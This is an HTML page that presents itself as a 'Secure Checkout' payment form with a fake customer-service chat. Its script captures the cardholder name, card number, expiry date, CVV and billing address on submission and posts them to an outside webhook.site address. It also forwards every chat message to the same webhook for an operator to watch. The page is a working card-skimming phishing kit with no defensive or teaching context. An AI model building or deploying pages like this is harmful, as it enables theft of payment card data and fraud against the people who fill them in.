<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Fake Checkout - Secure Payment</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; padding: 20px; }
        .container { max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        h1 { color: #4CAF50; text-align: center; }
        form { display: flex; flex-direction: column; }
        label { margin-top: 10px; font-weight: bold; }
        input { padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 4px; }
        button { background-color: #4CAF50; color: white; padding: 15px; border: none; border-radius: 4px; cursor: pointer; margin-top: 20px; }
        button:hover { background-color: #45a049; }
        .chat { margin-top: 30px; border-top: 1px solid #ccc; padding-top: 20px; }
        .chat-box { height: 200px; overflow-y: scroll; border: 1px solid #ccc; padding: 10px; background: #f9f9f9; }
        .chat-input { display: flex; margin-top: 10px; }
        .chat-input input { flex: 1; padding: 10px; }
        .chat-input button { padding: 10px; background: #4CAF50; color: white; border: none; }
    </style>
    <!-- Tidio Chat Script (kept for potential use, but chat is now handled via webhook for messages) -->
    <script src="//code.tidio.co/t3zd1g2eahfooddzvtjkzrfiyuwe2wch.js" async></script>
</head>
<body>
    <div class="container">
        <h1>Secure Checkout - Pay for Your Order</h1>
        <p>Enter your card details below to complete your purchase.</p>
        <form id="checkoutForm">
            <label for="name">Cardholder Name</label>
            <input type="text" id="name" required>
            
            <label for="cardNumber">Card Number</label>
            <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" required>
            
            <label for="expiry">Expiry Date (MM/YY)</label>
            <input type="text" id="expiry" placeholder="12/25" required>
            
            <label for="cvv">CVV</label>
            <input type="text" id="cvv" placeholder="123" required>
            
            <label for="billing">Billing Address</label>
            <input type="text" id="billing" required>
            
            <button type="submit">Pay Now (Free Sample)</button>
        </form>
        
        <div class="chat">
            <h2>Customer Service Chat</h2>
            <div class="chat-box" id="chatBox">
                <p><strong>Support:</strong> Hi! How can I help with your order?</p>
            </div>
            <div class="chat-input">
                <input type="text" id="chatMessage" placeholder="Type your message...">
                <button onclick="sendMessage()">Send</button>
            </div>
        </div>
    </div>
    
    <script>
        // Fake chat simulation - now sends messages to webhook for "live" monitoring
        let chatMessages = ["Support: Hi! How can I help with your order?"];
        function sendMessage() {
            const message = document.getElementById('chatMessage').value;
            if (message.trim() === '') return;
            chatMessages.push("You: " + message);
            updateChat();
            // Send message to webhook for real-time monitoring by operator
            fetch('https://webhook.site/6339be04-34a7-46b0-8088-c54588d175c9', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ message: message, timestamp: new Date().toISOString() })
            }).then(() => console.log('Message sent to webhook')).catch(err => console.error('Webhook error:', err));
            document.getElementById('chatMessage').value = '';
        }
        function updateChat() {
            document.getElementById('chatBox').innerHTML = chatMessages.map(msg => `<p>${msg}</p>`).join('');
            document.getElementById('chatBox').scrollTop = document.getElementById('chatBox').scrollHeight;
        }
        
        // Handle form submission (collect data and send to webhook)
        document.getElementById('checkoutForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const data = {
                name: document.getElementById('name').value,
                cardNumber: document.getElementById('cardNumber').value,
                expiry: document.getElementById('expiry').value,
                cvv: document.getElementById('cvv').value,
                billing: document.getElementById('billing').value
            };
            // Send to webhook
            fetch('https://webhook.site/6339be04-34a7-46b0-8088-c54588d175c9', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            }).then(() => {
                console.log('Data sent to webhook:', data);
                alert('Payment processed! (Fake - data captured and sent to webhook)');
            }).catch(err => console.error('Webhook error:', err));
        });

        // Hide Tidio floating widget if loaded
        window.addEventListener('load', function() {
            if (typeof tidioChatApi !== 'undefined') {
                tidioChatApi.display(false);
            }
        });
    </script>
</body>
</html>